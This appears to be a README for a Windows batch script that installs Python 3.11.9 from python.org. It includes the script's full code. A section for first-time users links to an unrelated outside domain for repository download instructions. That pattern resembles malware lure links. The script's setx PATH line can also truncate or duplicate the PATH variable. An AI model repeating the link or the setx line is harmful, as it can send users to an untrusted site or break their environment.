# Python 3.11.9 Installation Script

This script automates the installation process of Python 3.11.9 on your system and automatically adds Python to the system PATH.

## Prerequisites

- **Windows operating system**: Ensure that your system is running on Windows.
- **Internet connection**: A stable internet connection is required to download the Python installer.

## How to Download the Repo for First-Time Users

For detailed instructions on how to download the repository, please click on the following link: [**Instructions**](https://www.gitprojects.fnbubbles420.org/how-to-download-repos).

## Usage

1. **Download the script**: Save the file `install_python_3.11.9.bat` to your desired location on your computer.
2. **Run the script**: Double-click on the script file to start the installation process.

## Instructions

- When you run the script, it will first prompt you to confirm whether you want to proceed with the installation.
- **If you choose to continue** (`Y`):
  - The script will download the Python 3.11.9 installer from the official Python website.
  - It will then install Python silently, meaning you won't need to interact with the installer manually.
  - After successful installation, the script will add the Python Scripts directory to your system's PATH, allowing you to run Python from any command prompt.
- **If you choose not to continue** (`N`):
  - The installation will be cancelled, and the script will exit.

## Usage Example

Here is a brief overview of what the script does, provided as an example within the markdown:

```batch
@echo off

echo This script will install Python 3.11.9 on your system.
echo Do you want to continue with the installation? (Y/N)

set /p choice=
if /i "%choice%"=="Y" (
    echo Downloading Python 3.11.9...
    bitsadmin /transfer myDownloadJob /download /priority normal https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe "%cd%\python-3.11.9.exe"
    if exist "%cd%\python-3.11.9.exe" (
        echo Installing Python 3.11.9...
        "%cd%\python-3.11.9.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
        if %ERRORLEVEL% EQU 0 (
            echo Python 3.11.9 has been installed successfully.
            echo Adding Python Scripts directory to system PATH...
            setx PATH "%PATH%;%ProgramFiles%\Python311\Scripts"
            echo Python Scripts directory has been added to the system PATH.
        ) else (
            echo Installation failed.
        )
    ) else (
        echo Download failed.
    )
) else (
    echo Installation cancelled.
)

pause
```
